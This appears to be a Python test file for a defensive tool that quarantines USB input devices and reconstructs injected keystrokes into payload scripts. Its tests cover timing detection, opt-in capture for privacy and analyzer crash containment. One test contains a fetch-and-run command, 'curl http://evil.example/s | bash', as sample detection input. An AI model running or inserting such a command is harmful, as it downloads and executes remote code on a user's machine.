"""
Tests for payload extraction and for the plugin layer's containment property.

The privacy assertions here are as important as the reconstruction ones: they
encode the promise that the default configuration cannot recover what anybody
typed, even in memory.
"""

import unittest

from probolos import analyzers, payload, quarantine, rules

# Codes used below, from linux/input-event-codes.h
K = {"h": 35, "e": 18, "l": 38, "o": 24, "space": 57, "enter": 28,
     "lshift": 42, "meta": 125, "r": 19, "c": 46, "ctrl": 29,
     "u": 22, "1": 2, "esc": 1}

PRESS, RELEASE = 1, 0


def ev(*items):
    """Build (offset, code, value) triples with plausible timing."""
    return [(0.1 * i, code, value) for i, (code, value) in enumerate(items)]


def typed(word):
    """Press and release each letter of a lowercase word."""
    out = []
    for ch in word:
        out += [(K[ch], PRESS), (K[ch], RELEASE)]
    return out


class TestReconstruction(unittest.TestCase):

    def test_plain_text_is_recovered(self):
        result = payload.reconstruct(ev(*typed("hello")))
        self.assertEqual(result.lines, ["STRING hello"])
        self.assertEqual(result.keystrokes, 5)

    def test_shift_produces_capitals(self):
        """Shift is held across the H, then released before the e."""
        events = ev((K["lshift"], PRESS), (K["h"], PRESS), (K["h"], RELEASE),
                    (K["lshift"], RELEASE), (K["e"], PRESS), (K["e"], RELEASE))
        self.assertEqual(payload.reconstruct(events).lines, ["STRING He"])

    def test_named_keys_break_the_text_run(self):
        result = payload.reconstruct(ev(*typed("hello"),
                                        (K["enter"], PRESS),
                                        (K["enter"], RELEASE)))
        self.assertEqual(result.lines, ["STRING hello", "ENTER"])

    def test_chords_are_reported_as_actions(self):
        """GUI+r is the opening move of most Windows payloads."""
        events = ev((K["meta"], PRESS), (K["r"], PRESS), (K["r"], RELEASE),
                    (K["meta"], RELEASE))
        self.assertEqual(payload.reconstruct(events).lines, ["GUI R"])

    def test_auto_repeat_is_not_counted_as_typing(self):
        """value 2 means a key is held, not struck again."""
        events = [(0.0, K["h"], PRESS), (0.1, K["h"], 2), (0.2, K["h"], 2),
                  (0.3, K["h"], RELEASE)]
        result = payload.reconstruct(events)
        self.assertEqual(result.keystrokes, 1)
        self.assertEqual(result.lines, ["STRING h"])

    def test_modifiers_are_not_counted_as_keystrokes(self):
        events = ev((K["lshift"], PRESS), (K["lshift"], RELEASE))
        self.assertEqual(payload.reconstruct(events).keystrokes, 0)

    def test_long_payloads_are_truncated_and_say_so(self):
        result = payload.reconstruct(ev(*typed("hello" * 400)), max_chars=64)
        self.assertTrue(result.truncated)

    def test_suspicious_tokens_are_surfaced(self):
        """
        The point of extraction: not 'a device was blocked' but 'the device
        tried to run this'.
        """
        result = payload.Payload(text="curl http://evil.example/s | bash")
        tokens = result.suspicious_tokens()
        self.assertIn("curl", tokens)
        self.assertIn("http://", tokens)

    def test_ordinary_text_has_no_suspicious_tokens(self):
        self.assertEqual(payload.Payload(text="hello there").suspicious_tokens(), [])


class TestCaptureIsOptIn(unittest.TestCase):

    def test_default_observation_stores_no_key_content(self):
        """
        The privacy guarantee, as an assertion rather than a promise: with
        capture off, no key identity exists anywhere -- not on disk, not in
        memory.
        """
        obs = quarantine.Observation(capture=False)
        obs.key_presses.append(quarantine.KeyPress(timestamp=0.4))
        self.assertIsNone(obs.key_presses[0].code)
        self.assertEqual(obs.raw_events, [])
        self.assertIsNone(payload.reconstruct_observation(obs))

    def test_timing_analysis_still_works_without_key_content(self):
        """Stage 3 must not depend on knowing WHICH keys were pressed."""
        obs = quarantine.Observation(capture=False, duration=3.0,
                                     nodes=["/dev/input/event20"],
                                     grabbed=["/dev/input/event20"])
        t = 0.3
        for _ in range(10):
            obs.key_presses.append(quarantine.KeyPress(timestamp=t))
            t += 0.008
        ids = [f.rule_id for f in rules.behaviour_findings(obs)]
        self.assertIn("machine-generated-keystrokes", ids)

    def test_capture_enabled_reconstructs(self):
        obs = quarantine.Observation(capture=True)
        obs.raw_events = ev(*typed("hello"))
        recovered = payload.reconstruct_observation(obs)
        self.assertEqual(recovered.lines, ["STRING hello"])

    def test_payload_analyzer_is_silent_without_capture(self):
        obs = quarantine.Observation(capture=False)
        result = analyzers.PayloadAnalyzer().analyze(
            analyzers.Context(device=None, observation=obs))
        self.assertEqual(result, [])

    def test_payload_analyzer_reports_when_capture_is_on(self):
        obs = quarantine.Observation(capture=True)
        obs.raw_events = ev(*typed("hello"))
        findings = analyzers.PayloadAnalyzer().analyze(
            analyzers.Context(device=None, observation=obs))
        self.assertEqual([f.rule_id for f in findings], ["payload-captured"])
        self.assertEqual(rules.worst(findings), rules.Severity.CRITICAL)


class TestAnalyzerContainment(unittest.TestCase):

    class Exploding(analyzers.Analyzer):
        id = "exploding"

        def analyze(self, ctx):
            raise RuntimeError("heuristic went wrong")

    def test_a_broken_analyzer_cannot_stop_the_others(self):
        """
        A crash in a speculative check must never prevent somebody from
        admitting their keyboard.
        """
        findings = analyzers.run(
            analyzers.Context(device=None),
            analyzers=[self.Exploding()])
        self.assertEqual(len(findings), 1)
        self.assertTrue(findings[0].rule_id.startswith("analyzer-failed"))

    def test_failure_is_visible_rather_than_silent(self):
        findings = analyzers.run(analyzers.Context(device=None),
                                 analyzers=[self.Exploding()])
        self.assertNotEqual(rules.worst(findings), rules.Severity.INFO)

    def test_analyzers_needing_an_observation_are_skipped_without_one(self):
        findings = analyzers.run(
            analyzers.Context(device=None, observation=None),
            analyzers=[analyzers.BehaviourAnalyzer()])
        self.assertEqual(findings, [])

    def test_findings_come_back_worst_first(self):
        class Noisy(analyzers.Analyzer):
            id = "noisy"

            def analyze(self, ctx):
                return [
                    rules.Finding("a", rules.Severity.NOTICE, "n", ""),
                    rules.Finding("b", rules.Severity.CRITICAL, "c", ""),
                    rules.Finding("c", rules.Severity.WARNING, "w", ""),
                ]

        findings = analyzers.run(analyzers.Context(device=None),
                                 analyzers=[Noisy()])
        self.assertEqual([f.severity for f in findings],
                         [rules.Severity.CRITICAL, rules.Severity.WARNING,
                          rules.Severity.NOTICE])


if __name__ == "__main__":
    unittest.main(verbosity=2)
